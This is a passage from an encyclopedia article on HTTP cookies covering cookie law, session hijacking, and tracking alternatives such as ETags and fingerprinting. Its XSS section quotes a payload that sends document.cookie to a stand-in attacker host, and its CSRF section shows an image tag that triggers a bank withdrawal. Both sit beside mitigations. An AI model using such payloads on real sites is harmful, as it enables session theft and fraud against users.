In 2009, the policy was amended by Directive 2009/136/EC, which included a change to Article 5, Paragraph 3. Instead of having an option for users to opt out of cookie storage, the revised Directive requires consent to be obtained for cookie storage.[[56]](https://en.wikipedia.org/wiki/HTTP_cookie#cite_note-ICO_reference-56)

In June 2012, European [data protection](https://en.wikipedia.org/wiki/Information_privacy) authorities adopted an opinion which clarifies that some cookie users might be exempt from the requirement to gain consent:

- Some cookies can be exempted from informed consent under certain conditions if they are not used for additional purposes. These cookies include cookies used to keep track of a user's input when filling online forms or as a shopping cart.
- First party analytics cookies are not likely to create a privacy risk if websites provide clear information about the cookies to users and privacy safeguards.[[58]](https://en.wikipedia.org/wiki/HTTP_cookie#cite_note-58)

The industry's response has been largely negative. Robert Bond of the law firm Speechly Bircham describes the effects as "far-reaching and incredibly onerous" for "all UK companies". Simon Davis of [Privacy International](https://en.wikipedia.org/wiki/Privacy_International) argues that proper enforcement would "destroy the entire industry".[[59]](https://en.wikipedia.org/wiki/HTTP_cookie#cite_note-59)

The [P3P](https://en.wikipedia.org/wiki/P3P) specification offers possibility for a server to state a privacy policy using an [HTTP header](https://en.wikipedia.org/wiki/HTTP_header), which specifies which kind of information it collects and for which purpose. These policies include (but are not limited to) the use of information gathered using cookies. According to the P3P specification, a browser can accept or reject cookies by comparing the privacy policy with the stored user preferences or ask the user, presenting them the privacy policy as declared by the server. However, the P3P specification was criticized by web developers for its complexity. Some websites do not correctly implement it. For example, [Facebook](https://en.wikipedia.org/wiki/Facebook) jokingly used "HONK" as its P3P header for a period.[[60]](https://en.wikipedia.org/wiki/HTTP_cookie#cite_note-nyt-bits-60) Only [Internet Explorer](https://en.wikipedia.org/wiki/Internet_Explorer) provides adequate support for the specification.

Third-party cookies can be blocked by most browsers to increase privacy and reduce tracking by advertising and tracking companies without negatively affecting the user's web experience. Many advertising operators have an opt-out option to behavioural advertising, with a generic cookie in the browser stopping behavioural advertising.[[60]](https://en.wikipedia.org/wiki/HTTP_cookie#cite_note-nyt-bits-60)[[61]](https://en.wikipedia.org/wiki/HTTP_cookie#cite_note-howtoblock-61)

## Cookie theft and session hijacking

Most websites use cookies as the only identifiers for user sessions, because other methods of identifying web users have limitations and vulnerabilities. If a website uses cookies as session identifiers, attackers can impersonate users' requests by stealing a full set of victims' cookies. From the web server's point of view, a request from an attacker then has the same authentication as the victim's requests; thus the request is performed on behalf of the victim's session.

Listed here are various scenarios of cookie theft and user session hijacking (even without stealing user cookies) which work with websites which rely solely on HTTP cookies for user identification.

### Network eavesdropping

[![220px-Cookie-sniffing.svg.png](../_resources/10998a4dcc78d94f0a2a9b6ddbf9591e.png)](https://en.wikipedia.org/wiki/File:Cookie-sniffing.svg)

A cookie can be stolen by another computer that is allowed reading from the network

Traffic on a network can be intercepted and read by computers on the network other than the sender and receiver (particularly over [unencrypted](https://en.wikipedia.org/wiki/Plaintext) open [Wi-Fi](https://en.wikipedia.org/wiki/Wi-Fi)). This traffic includes cookies sent on ordinary unencrypted [HTTP sessions](https://en.wikipedia.org/wiki/HTTP_sessions). Where network traffic is not encrypted, attackers can therefore read the communications of other users on the network, including HTTP cookies as well as the entire contents of the conversations, for the purpose of a [man-in-the-middle attack](https://en.wikipedia.org/wiki/Man-in-the-middle_attack).

An attacker could use intercepted cookies to impersonate a user and perform a malicious task, such as transferring money out of the victim's bank account.

This issue can be resolved by securing the communication between the user's computer and the server by employing [Transport Layer Security](https://en.wikipedia.org/wiki/Transport_Layer_Security) ([HTTPS](https://en.wikipedia.org/wiki/HTTPS) protocol) to encrypt the connection. A server can specify the `Secure` flag while setting a cookie, which will cause the browser to send the cookie only over an encrypted channel, such as an SSL connection.[[31]](https://en.wikipedia.org/wiki/HTTP_cookie#cite_note-httponlyrfc-31)

### Publishing false sub-domain: DNS cache poisoning

If an attacker is able to cause a [DNS server](https://en.wikipedia.org/wiki/DNS_server) to cache a fabricated DNS entry (called [DNS cache poisoning](https://en.wikipedia.org/wiki/DNS_cache_poisoning)), then this could allow the attacker to gain access to a user's cookies. For example, an attacker could use DNS cache poisoning to create a fabricated DNS entry of `f12345.www.example.com` that points to the [IP address](https://en.wikipedia.org/wiki/IP_address) of the attacker's server. The attacker can then post an image URL from his own server (for example, `http://f12345.www.example.com/img_4_cookie.jpg`). Victims reading the attacker's message would download this image from `f12345.www.example.com`. Since `f12345.www.example.com` is a sub-domain of `www.example.com`, victims' browsers would submit all `example.com`-related cookies to the attacker's server.

If an attacker is able to accomplish this, it is usually the fault of the [Internet Service Providers](https://en.wikipedia.org/wiki/Internet_Service_Provider) for not properly securing their DNS servers. However, the severity of this attack can be lessened if the target website uses secure cookies. In this case, the attacker would have the extra challenge[[62]](https://en.wikipedia.org/wiki/HTTP_cookie#cite_note-certificatehack-62) of obtaining the target website's SSL certificate from a [certificate authority](https://en.wikipedia.org/wiki/Certificate_authority), since secure cookies can only be transmitted over an encrypted connection. Without a matching SSL certificate, victims' browsers would display a warning message about the attacker's invalid certificate, which would help deter users from visiting the attacker's fraudulent website and sending the attacker their cookies.

### Cross-site scripting: cookie theft

Main article: [Cross-site scripting](https://en.wikipedia.org/wiki/Cross-site_scripting)

Cookies can also be stolen using a technique called cross-site scripting. This occurs when an attacker takes advantage of a website that allows its users to post unfiltered [HTML](https://en.wikipedia.org/wiki/HTML) and [JavaScript](https://en.wikipedia.org/wiki/JavaScript) content. By posting malicious HTML and JavaScript code, the attacker can cause the victim's web browser to send the victim's cookies to a website the attacker controls.

As an example, an attacker may post a message on `www.example.com` with the following link:

<a href="#" onclick="window.location = 'http://attacker.com/stole.cgi?text=' + escape(document.cookie); return false;">Click here!</a>

[![220px-Cookie-theft.svg.png](../_resources/99207c04a183e2bcfd8e479671326aef.png)](https://en.wikipedia.org/wiki/File:Cookie-theft.svg)

Cross-site scripting: a cookie that should be only exchanged between a server and a client is sent to another party.

When another user clicks on this link, the browser executes the piece of code within the `onclick` attribute, thus replacing the string `document.cookie` with the list of cookies that are accessible from the current page. As a result, this list of cookies is sent to the `attacker.com` server. If the attacker's malicious posting is on an HTTPS website `https://www.example.com`, secure cookies will also be sent to attacker.com in plain text.

It is the responsibility of the website developers to filter out such malicious code.

Such attacks can be mitigated by using HttpOnly cookies. These cookies will not be accessible by client-side scripting languages like JavaScript, and therefore, the attacker will not be able to gather these cookies.

### Cross-site scripting: proxy request

In older versions of many browsers, there were security holes in the implementation of the [XMLHttpRequest](https://en.wikipedia.org/wiki/XMLHttpRequest) API. This API allows pages to specify a proxy server that would get the reply, and this proxy server is not subject to the [same-origin policy](https://en.wikipedia.org/wiki/Same-origin_policy). For example, a victim is reading an attacker's posting on `www.example.com`, and the attacker's script is executed in the victim's browser. The script generates a request to `www.example.com` with the proxy server `attacker.com`. Since the request is for `www.example.com`, all `example.com` cookies will be sent along with the request, but routed through the attacker's proxy server. Hence, the attacker would be able to harvest the victim's cookies.

This attack would not work with secure cookies, since they can only be transmitted over [HTTPS](https://en.wikipedia.org/wiki/HTTPS) connections, and the HTTPS protocol dictates end-to-end encryption (i.e. the information is encrypted on the user's browser and decrypted on the destination server). In this case, the proxy server would only see the raw, encrypted bytes of the HTTP request.

### Cross-site request forgery

Main article: [Cross-site request forgery](https://en.wikipedia.org/wiki/Cross-site_request_forgery)

For example, Bob might be browsing a chat forum where another user, Mallory, has posted a message. Suppose that Mallory has crafted an HTML image element that references an action on Bob's bank's website (rather than an image file), e.g.,

<img src="http://bank.example.com/withdraw?account=bob&amount=1000000&for=mallory">

If Bob's bank keeps his authentication information in a cookie, and if the cookie hasn't expired, then the attempt by Bob's browser to load the image will submit the withdrawal form with his cookie, thus authorizing a transaction without Bob's approval.

## Drawbacks of cookies

Besides privacy concerns, cookies also have some technical drawbacks. In particular, they do not always accurately identify users, they can be used for security attacks, and they are often at odds with the Representational State Transfer ([REST](https://en.wikipedia.org/wiki/Representational_State_Transfer)) software architectural style.[[63]](https://en.wikipedia.org/wiki/HTTP_cookie#cite_note-63)[[64]](https://en.wikipedia.org/wiki/HTTP_cookie#cite_note-64)

### Inaccurate identification

If more than one browser is used on a computer, each usually has a separate storage area for cookies. Hence cookies do not identify a person, but a combination of a user account, a computer, and a web browser. Thus, anyone who uses multiple accounts, computers, or browsers has multiple sets of cookies.

Likewise, cookies do not differentiate between multiple users who share the same [user account](https://en.wikipedia.org/wiki/User_account), computer, and browser.

### Inconsistent state on client and server

The use of cookies may generate an inconsistency between the state of the client and the state as stored in the cookie. If the user acquires a cookie and then clicks the "Back" button of the browser, the state on the browser is generally not the same as before that acquisition. As an example, if the shopping cart of an online shop is built using cookies, the content of the cart may not change when the user goes back in the browser's history: if the user presses a button to add an item in the shopping cart and then clicks on the "Back" button, the item remains in the shopping cart. This might not be the intention of the user, who possibly wanted to undo the addition of the item. This can lead to unreliability, confusion, and bugs. Web developers should therefore be aware of this issue and implement measures to handle such situations.

## Alternatives to cookies

Some of the operations that can be done using cookies can also be done using other mechanisms.

### JSON Web Tokens

A [JSON Web Token](https://en.wikipedia.org/wiki/JSON_Web_Token) (JWT) is a self-contained packet of information that can be used to store user identity and authenticity information. This allows them to be used in place of session cookies. Unlike cookies, which are automatically attached to each HTTP request by the browser, JWTs must be explicitly attached to each HTTP request by the web application.

### HTTP authentication

The HTTP protocol includes the [basic access authentication](https://en.wikipedia.org/wiki/Basic_access_authentication) and the [digest access authentication](https://en.wikipedia.org/wiki/Digest_access_authentication) protocols, which allow access to a web page only when the user has provided the correct username and password. If the server requires such credentials for granting access to a web page, the browser requests them from the user and, once obtained, the browser stores and sends them in every subsequent page request. This information can be used to track the user.

### IP address

Some users may be tracked based on the [IP address](https://en.wikipedia.org/wiki/IP_address) of the computer requesting the page. The server knows the IP address of the computer running the browser (or the [proxy](https://en.wikipedia.org/wiki/Proxy_server), if any is used) and could theoretically link a user's session to this IP address.

However, IP addresses are generally not a reliable way to track a session or identify a user. Many computers designed to be used by a single user, such as office PCs or home PCs, are behind a network address translator (NAT). This means that several PCs will share a public IP address. Furthermore, some systems, such as [Tor](https://en.wikipedia.org/wiki/Tor_(anonymity_network)), are designed to retain [Internet anonymity](https://en.wikipedia.org/wiki/Internet_anonymity), rendering tracking by IP address impractical, impossible, or a security risk.

### URL (query string)

A more precise technique is based on embedding information into URLs. The [query string](https://en.wikipedia.org/wiki/Query_string) part of the [URL](https://en.wikipedia.org/wiki/Uniform_Resource_Locator) is the part that is typically used for this purpose, but other parts can be used as well. The [Java Servlet](https://en.wikipedia.org/wiki/Java_Servlet) and [PHP](https://en.wikipedia.org/wiki/PHP) session mechanisms both use this method if cookies are not enabled.

This method consists of the web server appending query strings containing a unique session identifier to all the links inside of a web page. When the user follows a link, the browser sends the query string to the server, allowing the server to identify the user and maintain state.

These kinds of query strings are very similar to cookies in that both contain arbitrary pieces of information chosen by the server and both are sent back to the server on every request. However, there are some differences. Since a query string is part of a URL, if that URL is later reused, the same attached piece of information will be sent to the server, which could lead to confusion. For example, if the preferences of a user are encoded in the query string of a URL and the user sends this URL to another user by [e-mail](https://en.wikipedia.org/wiki/E-mail), those preferences will be used for that other user as well.

Moreover, if the same user accesses the same page multiple times from different sources, there is no guarantee that the same query string will be used each time. For example, if a user visits a page by coming from a page *internal to the site* the first time, and then visits the same page by coming from an *external [search engine](https://en.wikipedia.org/wiki/Search_engine)* the second time, the query strings would likely be different. If cookies were used in this situation, the cookies would be the same.

Other drawbacks of query strings are related to security. Storing data that identifies a session in a query string enables [session fixation](https://en.wikipedia.org/wiki/Session_fixation) attacks, [referer](https://en.wikipedia.org/wiki/HTTP_referer) logging attacks and other [security exploits](https://en.wikipedia.org/wiki/Exploit_(computer_security)). Transferring session identifiers as HTTP cookies is more secure.

### Hidden form fields

Another form of session tracking is to use [web forms](https://en.wikipedia.org/wiki/Form_(web)) with hidden fields. This technique is very similar to using URL query strings to hold the information and has many of the same advantages and drawbacks. In fact, if the form is handled with the [HTTP](https://en.wikipedia.org/wiki/HTTP) GET method, then this technique is similar to using URL query strings, since the GET method adds the form fields to the URL as a query string. But most forms are handled with HTTP POST, which causes the form information, including the hidden fields, to be sent in the HTTP request body, which is neither part of the URL, nor of a cookie.

This approach presents two advantages from the point of view of the tracker. First, having the tracking information placed in the HTTP request body rather than in the URL means it will not be noticed by the average user. Second, the session information is not copied when the user copies the URL (to bookmark the page or send it via email, for example).

### "window.name" DOM property

All current web browsers can store a fairly large amount of data (2–32 MB) via JavaScript using the [DOM](https://en.wikipedia.org/wiki/Document_Object_Model) property `window.name`. This data can be used instead of session cookies and is also cross-domain. The technique can be coupled with [JSON](https://en.wikipedia.org/wiki/JSON)/JavaScript objects to store complex sets of session variables[[65]](https://en.wikipedia.org/wiki/HTTP_cookie#cite_note-65) on the client side.

The downside is that every separate window or [tab](https://en.wikipedia.org/wiki/Tabbed_document_interface) will initially have an empty `window.name` property when opened. Furthermore, the property can be used for tracking visitors across different websites, making it of concern for [Internet privacy](https://en.wikipedia.org/wiki/Internet_privacy).

In some respects, this can be more secure than cookies due to the fact that its contents are not automatically sent to the server on every request like cookies are, so it is not vulnerable to network cookie sniffing attacks. However, if special measures are not taken to protect the data, it is vulnerable to other attacks because the data is available across different websites opened in the same window or tab.

### Identifier for advertisers

Apple uses a tracking technique called "identifier for advertisers" (IDFA). This technique assigns a unique identifier to every user that buys an Apple iOS device (such as an iPhone or iPad). This identifier is then used by Apple's advertising network, iAd, to determine the ads that individuals are viewing and responding to.[[66]](https://en.wikipedia.org/wiki/HTTP_cookie#cite_note-IDFA-66)

### ETag

Main article: [HTTP ETag § Tracking using ETags](https://en.wikipedia.org/wiki/HTTP_ETag#Tracking_using_ETags)

Because ETags are cached by the browser, and returned with subsequent requests for the same resource, a tracking server can simply repeat any ETag received from the browser to ensure an assigned ETag persists indefinitely (in a similar way to persistent cookies). Additional caching headers can also enhance the preservation of ETag data.

ETags can be flushed in some browsers by clearing the [browser cache](https://en.wikipedia.org/wiki/Browser_cache).

### Web storage

Main article: [Web storage](https://en.wikipedia.org/wiki/Web_storage)

Some web browsers support persistence mechanisms which allow the page to store the information locally for later use.

The [HTML5](https://en.wikipedia.org/wiki/HTML5) standard (which most modern web browsers support to some extent) includes a JavaScript API called [Web storage](https://en.wikipedia.org/wiki/Web_storage) that allows two types of storage: local storage and session storage. Local storage behaves similarly to [persistent cookies](https://en.wikipedia.org/wiki/HTTP_cookie#Persistent_cookie) while session storage behaves similarly to [session cookies](https://en.wikipedia.org/wiki/HTTP_cookie#Session_cookie), except that session storage is tied to an individual tab/window's lifetime (AKA a page session), not to a whole browser session like session cookies.[[67]](https://en.wikipedia.org/wiki/HTTP_cookie#cite_note-67)

Internet Explorer supports persistent information [[68]](https://en.wikipedia.org/wiki/HTTP_cookie#cite_note-68) in the browser's history, in the browser's favorites, in an XML store ("user data"), or directly within a web page saved to disk.

Some web browser plugins include persistence mechanisms as well. For example, [Adobe Flash](https://en.wikipedia.org/wiki/Adobe_Flash) has [Local shared object](https://en.wikipedia.org/wiki/Local_shared_object) and [Microsoft Silverlight](https://en.wikipedia.org/wiki/Microsoft_Silverlight) has Isolated storage.[[69]](https://en.wikipedia.org/wiki/HTTP_cookie#cite_note-69)

### Browser cache

Main article: [Web cache](https://en.wikipedia.org/wiki/Web_cache)

The browser cache can also be used to store information that can be used to track individual users. This technique takes advantage of the fact that the web browser will use resources stored within the cache instead of downloading them from the website when it determines that the cache already has the most up-to-date version of the resource.

For example, a website could serve a JavaScript file that contains code which sets a unique identifier for the user (for example, `var userId = 3243242;`). After the user's initial visit, every time the user accesses the page, this file will be loaded from the cache instead of downloaded from the server. Thus, its content will never change.

### Browser fingerprint

Main article: [Device fingerprint](https://en.wikipedia.org/wiki/Device_fingerprint)

A browser fingerprint is information collected about a browser's configuration, such as version number, screen resolution, and operating system, for the purpose of identification. Fingerprints can be used to fully or partially identify individual users or devices even when cookies are turned off.

Basic [web browser](https://en.wikipedia.org/wiki/Web_browser) configuration information has long been collected by [web analytics](https://en.wikipedia.org/wiki/Web_analytics) services in an effort to accurately measure real human [web traffic](https://en.wikipedia.org/wiki/Web_traffic) and discount various forms of [click fraud](https://en.wikipedia.org/wiki/Click_fraud). With the assistance of [client-side scripting](https://en.wikipedia.org/wiki/Client-side_scripting) languages, collection of much more esoteric parameters is possible.[[70]](https://en.wikipedia.org/wiki/HTTP_cookie#cite_note-70)[[71]](https://en.wikipedia.org/wiki/HTTP_cookie#cite_note-71) Assimilation of such information into a single string comprises a device fingerprint. In 2010, [EFF](https://en.wikipedia.org/wiki/Electronic_Frontier_Foundation) measured at least 18.1 bits of [entropy](https://en.wikipedia.org/wiki/Entropy_(information_theory)) possible from browser fingerprinting.[[72]](https://en.wikipedia.org/wiki/HTTP_cookie#cite_note-72)  [Canvas fingerprinting](https://en.wikipedia.org/wiki/Canvas_fingerprinting), a more recent technique, claims to add another 5.7 bits.

## See also

## References

1. **[Jump up ^](https://en.wikipedia.org/wiki/HTTP_cookie#cite_ref-1)**  Vamosi, Robert (2008-04-14). ["Gmail cookie stolen via Google Spreadsheets"](http://news.cnet.com/8301-10789_3-9918582-57.html). *News.cnet.com*. Retrieved 19 October 2017.

2. **[Jump up ^](https://en.wikipedia.org/wiki/HTTP_cookie#cite_ref-2)**  ["What about the "EU Cookie Directive"?"](http://webcookies.org/faq/#Directive). WebCookies.org. 2013. Retrieved 19 October 2017.

3. **[Jump up ^](https://en.wikipedia.org/wiki/HTTP_cookie#cite_ref-eulaw_3-0)**  ["New net rules set to make cookies crumble"](http://www.bbc.co.uk/news/technology-12668552). *BBC*. 2011-03-08.

4. **[Jump up ^](https://en.wikipedia.org/wiki/HTTP_cookie#cite_ref-4)**  ["Sen. Rockefeller: Get Ready for a Real Do-Not-Track Bill for Online Advertising"](http://adage.com/article/digital/sen-rockefeller-ready-a-real-track-bill/227426/). *Adage.com*. 2011-05-06.

5. **[Jump up ^](https://en.wikipedia.org/wiki/HTTP_cookie#cite_ref-5)**  [Want to use my wifi?](https://thejh.net/written-stuff/want-to-use-my-wifi?), Jann Horn, accessed 2018-01-05.

6. **[Jump up ^](https://en.wikipedia.org/wiki/HTTP_cookie#cite_ref-6)**  ["Where cookie comes from :: DominoPower"](http://dominopower.com/article/where-cookie-comes-from/). *dominopower.com*. Retrieved 19 October 2017.

7. **[Jump up ^](https://en.wikipedia.org/wiki/HTTP_cookie#cite_ref-7)**  Raymond, Eric (ed.). ["magic cookie"](http://catb.org/jargon/html/M/magic-cookie.html). *The Jargon File (version 4.4.7)*. Retrieved 8 September 2017.CS1 maint: Extra text: authors list ([link](https://en.wikipedia.org/wiki/Category:CS1_maint:_Extra_text:_authors_list))

8. **[Jump up ^](https://en.wikipedia.org/wiki/HTTP_cookie#cite_ref-8)**  Schwartz, John (2001-09-04). ["Giving Web a Memory Cost Its Users Privacy"](https://www.nytimes.com/2001/09/04/technology/04COOK.html). *The New York Times*.

9. ^ [Jump up to: ***a***](https://en.wikipedia.org/wiki/HTTP_cookie#cite_ref-ks_9-0)  [***b***](https://en.wikipedia.org/wiki/HTTP_cookie#cite_ref-ks_9-1) Kesan, Jey; and Shah, Rajiv ; [*Deconstructing Code*](http://papers.ssrn.com/sol3/papers.cfm?abstract_id=597543), SSRN.com, chapter II.B (Netscape's cookies), Yale Journal of Law and Technology, 6, 277–389

10. ^ [Jump up to: ***a***](https://en.wikipedia.org/wiki/HTTP_cookie#cite_ref-kristol_10-0)  [***b***](https://en.wikipedia.org/wiki/HTTP_cookie#cite_ref-kristol_10-1) Kristol, David; *HTTP Cookies: Standards, privacy, and politics*, ACM Transactions on Internet Technology, 1(2), 151–198, 2001 [doi](https://en.wikipedia.org/wiki/Digital_object_identifier):[10.1145/502152.502153](https://doi.org/10.1145%2F502152.502153) (an expanded version is freely available at [arXiv:cs/0105018v1 [cs.SE]](https://arxiv.org/abs/cs.SE/0105018))

11. **[Jump up ^](https://en.wikipedia.org/wiki/HTTP_cookie#cite_ref-11)**  ["Press Release: Netscape Communications Offers New Network Navigator Free On The Internet"](https://web.archive.org/web/20061207145832/http://wp.netscape.com/newsref/pr/newsrelease1.html). Web.archive.org. Archived from [the original](http://wp.netscape.com/newsref/pr/newsrelease1.html) on 2006-12-07. Retrieved 2010-05-22.

12. **[Jump up ^](https://en.wikipedia.org/wiki/HTTP_cookie#cite_ref-12)**  ["Usenet Post by Marc Andreessen: Here it is, world!"](https://groups.google.com/group/comp.infosystems.www.users/msg/9a210e5f72278328). Groups.google.com. 1994-10-13. Retrieved 2010-05-22.

13. **[Jump up ^](https://en.wikipedia.org/wiki/HTTP_cookie#cite_ref-13)**  Hardmeier, Sandi (2005-08-25). ["The history of Internet Explorer"](http://www.microsoft.com/windows/IE/community/columns/historyofie.mspx). Microsoft. Retrieved 2009-01-04.

14. **[Jump up ^](https://en.wikipedia.org/wiki/HTTP_cookie#cite_ref-14)**  Jackson, T (1996-02-12). "This Bug in Your PC is a Smart Cookie". *Financial Times*.

15. **[Jump up ^](https://en.wikipedia.org/wiki/HTTP_cookie#cite_ref-15)**  ["Setting Cookies"](https://staff.washington.edu/fmf/2009/06/19/setting-cookies/). *staff.washington.edu*. June 19, 2009.

16. **[Jump up ^](https://en.wikipedia.org/wiki/HTTP_cookie#cite_ref-16)** The [edbrowse](https://en.wikipedia.org/wiki/Edbrowse) documentation version 3.5 said "Note that only Netscape-style cookies are supported. However, this is the most common flavor of cookie. It will probably meet your needs." This paragraph was removed in [later versions of the documentation](http://edbrowse.org/usersguide.html#cook) further to [RFC 2965](https://tools.ietf.org/html/rfc2965)'s deprecation.

17. **[Jump up ^](https://en.wikipedia.org/wiki/HTTP_cookie#cite_ref-HTTPStateMgmtToPS_17-0)**  Hodges, Jeff; Corry, Bil (6 March 2011). ["'HTTP State Management Mechanism' to Proposed Standard"](http://www.thesecuritypractice.com/the_security_practice/2011/03/http-state-management-mechanism-to-proposed-standard.html). *The Security Practice*. Retrieved 17 June 2016.

18. **[Jump up ^](https://en.wikipedia.org/wiki/HTTP_cookie#cite_ref-mscookie_18-0)** Microsoft Support [Description of Persistent and Per-Session Cookies in Internet Explorer](http://support.microsoft.com/kb/223799/EN-US) Article ID 223799, 2007

19. **[Jump up ^](https://en.wikipedia.org/wiki/HTTP_cookie#cite_ref-19)**  ["Maintaining session state with cookies"](http://msdn.microsoft.com/en-us/library/ms526029(v=vs.90).aspx). *Microsoft Developer Network*. Retrieved 22 October 2012.

20. **[Jump up ^](https://en.wikipedia.org/wiki/HTTP_cookie#cite_ref-20)**  ["'SameSite' cookie attribute, Chrome Platform tatus"](https://www.chromestatus.com/feature/4672634709082112). *Chromestatus.com*. Retrieved 2016-04-23.

21. **[Jump up ^](https://en.wikipedia.org/wiki/HTTP_cookie#cite_ref-21)**  Goodwin, Mark; West, Mike. ["Same-site Cookies"](https://tools.ietf.org/html/draft-west-first-party-cookies-07). *tools.ietf.org*. Retrieved 2016-04-23.

22. **[Jump up ^](https://en.wikipedia.org/wiki/HTTP_cookie#cite_ref-22)**  Goodwin, M.; West. ["Same-Site Cookies draft-ietf-httpbis-cookie-same-site-00"](https://tools.ietf.org/html/draft-ietf-httpbis-cookie-same-site-00). *tools.ietf.org*. Retrieved 2016-07-28.

23. **[Jump up ^](https://en.wikipedia.org/wiki/HTTP_cookie#cite_ref-23)**  ["Third party domains"](http://webcookies.org/third-party-cookies/). WebCookies.org.

24. **[Jump up ^](https://en.wikipedia.org/wiki/HTTP_cookie#cite_ref-24)**  ["Number of cookies"](http://webcookies.org/number-of-cookies/). WebCookies.org.

25. **[Jump up ^](https://en.wikipedia.org/wiki/HTTP_cookie#cite_ref-25)**  ["Learn more about the Public Suffix List"](https://publicsuffix.org/learn/). *Publicsuffix.org*. Retrieved 28 July 2016.

26. **[Jump up ^](https://en.wikipedia.org/wiki/HTTP_cookie#cite_ref-26)**  Mayer, Jonathan (19 August 2011). ["Tracking the Trackers: Microsoft Advertising"](http://cyberlaw.stanford.edu/node/6715). The Center for Internet and Society. Retrieved 28 September 2011.

27. **[Jump up ^](https://en.wikipedia.org/wiki/HTTP_cookie#cite_ref-27)**  Vijayan, Jaikumar. ["Microsoft disables 'supercookies' used on MSN.com visitors"](http://www.computerworld.com/article/2510494/data-privacy/microsoft-disables--supercookies--used-on-msn-com-visitors.html). Retrieved 23 November 2014.

28. **[Jump up ^](https://en.wikipedia.org/wiki/HTTP_cookie#cite_ref-Peng,_Weihong_2000_28-0)**  Peng, Weihong; Cisna, Jennifer (2000). ["HTTP Cookies, A Promising Technology"](http://search.proquest.com/docview/194487945?accountid=14541). *Proquest*. Online Information Review. Retrieved 29 March 2013.

29. **[Jump up ^](https://en.wikipedia.org/wiki/HTTP_cookie#cite_ref-Stenberg,_Daniel_2009_29-0)** Jim Manico quoting Daniel Stenberg, [Real world cookie length limits](http://manicode.blogspot.it/2009/08/real-world-cookie-length-limits.html)

30. **[Jump up ^](https://en.wikipedia.org/wiki/HTTP_cookie#cite_ref-30)** Rainie, Lee (2012). Networked: The New Social Operating System. p. 237

31. ^ [Jump up to: ***a***](https://en.wikipedia.org/wiki/HTTP_cookie#cite_ref-httponlyrfc_31-0)  [***b***](https://en.wikipedia.org/wiki/HTTP_cookie#cite_ref-httponlyrfc_31-1) IETF [HTTP State Management Mechanism, Apr, 2011](https://tools.ietf.org/html/rfc6265) Obsoletes [RFC 2965](https://tools.ietf.org/html/rfc2965)

32. **[Jump up ^](https://en.wikipedia.org/wiki/HTTP_cookie#cite_ref-32)**  ["Persistent client state HTTP cookies: Preliminary specification"](https://web.archive.org/web/20070805052634/http://wp.netscape.com/newsref/std/cookie_spec.html). Netscape. c. 1999. Archived from [the original](http://wp.netscape.com/newsref/std/cookie_spec.html) on 2007-08-05.

33. **[Jump up ^](https://en.wikipedia.org/wiki/HTTP_cookie#cite_ref-33)**  [RFC 2965](https://tools.ietf.org/html/rfc2965), HTTP State Management Mechanism ([IETF](https://en.wikipedia.org/wiki/Internet_Engineering_Task_Force))

34. **[Jump up ^](https://en.wikipedia.org/wiki/HTTP_cookie#cite_ref-CrumbExample_34-0)**  ["Cookie Property"](http://msdn2.microsoft.com/en-us/library/ms533693.aspx). *MSDN*. Microsoft. Retrieved 2009-01-04.

35. **[Jump up ^](https://en.wikipedia.org/wiki/HTTP_cookie#cite_ref-35)**  Shannon, Ross (2007-02-26). ["Cookies, Set and retrieve information about your readers"](http://www.yourhtmlsource.com/javascript/cookies.html). HTMLSource. Retrieved 2009-01-04.

36. **[Jump up ^](https://en.wikipedia.org/wiki/HTTP_cookie#cite_ref-36)**  ["HTTP State Management Mechanism, The Path Attribute"](http://tools.ietf.org/html/rfc6265#section-4.1.2.4). *IETF*. March 2014.

37. **[Jump up ^](https://en.wikipedia.org/wiki/HTTP_cookie#cite_ref-37)**  ["RFC 6265, HTTP State Management Mechanism, Domain matching"](http://tools.ietf.org/html/rfc6265#section-5.1.3). *IETF*. March 2014.

38. **[Jump up ^](https://en.wikipedia.org/wiki/HTTP_cookie#cite_ref-38)**  ["RFC 6265, HTTP State Management Mechanism, The Domain Attribute"](http://tools.ietf.org/html/rfc6265#section-4.1.2.3). *IETF*. March 2014.

39. **[Jump up ^](https://en.wikipedia.org/wiki/HTTP_cookie#cite_ref-39)**  ["Internet Explorer Cookie Internals (FAQ)"](https://blogs.msdn.microsoft.com/b/ieinternals/archive/2009/08/20/wininet-ie-cookie-internals-faq.aspx). 20 August 2009.

40. **[Jump up ^](https://en.wikipedia.org/wiki/HTTP_cookie#cite_ref-40)**  ["RFC 2109, HTTP State Management Mechanism, Set-Cookie syntax"](http://tools.ietf.org/html/rfc2109#section-4.2.2). *IETF*. March 2014.

41. **[Jump up ^](https://en.wikipedia.org/wiki/HTTP_cookie#cite_ref-41)**  ["RFC 6265, HTTP State Management Mechanism"](http://tools.ietf.org/html/rfc6265#section-5.1.1). *ietf.org*.

42. **[Jump up ^](https://en.wikipedia.org/wiki/HTTP_cookie#cite_ref-42)**  ["Cookies specification compatibility in modern browsers"](https://inikulin.github.io/cookie-compat/#MOZILLA0001). *inikulin.github.io*. 2016. Retrieved 2016-09-30.

43. **[Jump up ^](https://en.wikipedia.org/wiki/HTTP_cookie#cite_ref-43)**  Coles, Peter. ["HTTP Cookies: What's the difference between Max-age and Expires? – Peter Coles"](http://mrcoles.com/blog/cookies-max-age-vs-expires/). *Mrcoles.com*. Retrieved 28 July 2016.

44. **[Jump up ^](https://en.wikipedia.org/wiki/HTTP_cookie#cite_ref-Symantec-2007-2nd-exec_44-0)**  ["Symantec Internet Security Threat Report: Trends for July–December 2007 (Executive Summary)"](http://eval.symantec.com/mktginfo/enterprise/white_papers/b-whitepaper_exec_summary_internet_security_threat_report_xiii_04-2008.en-us.pdf) (PDF). **XIII**. Symantec Corp. April 2008: 1–3. Retrieved May 11, 2008.

45. **[Jump up ^](https://en.wikipedia.org/wiki/HTTP_cookie#cite_ref-45)**  Whalen, David (June 8, 2002). ["The Unofficial Cookie FAQ v2.6"](http://www.cookiecentral.com/faq/). Cookie Central. Retrieved 2009-01-04.

46. **[Jump up ^](https://en.wikipedia.org/wiki/HTTP_cookie#cite_ref-46)**  ["3rd-Party Cookies, DOM Storage and Privacy"](http://grack.com/blog/2010/01/06/3rd-party-cookies-dom-storage-and-privacy/). grack.com: Matt Mastracci's blog. January 6, 2010. Retrieved 2010-09-20.

47. **[Jump up ^](https://en.wikipedia.org/wiki/HTTP_cookie#cite_ref-microsoft2007_47-0)**  ["How to Manage Cookies in Internet Explorer 6"](http://support.microsoft.com/kb/283185). Microsoft. December 18, 2007. Retrieved 2009-01-04.

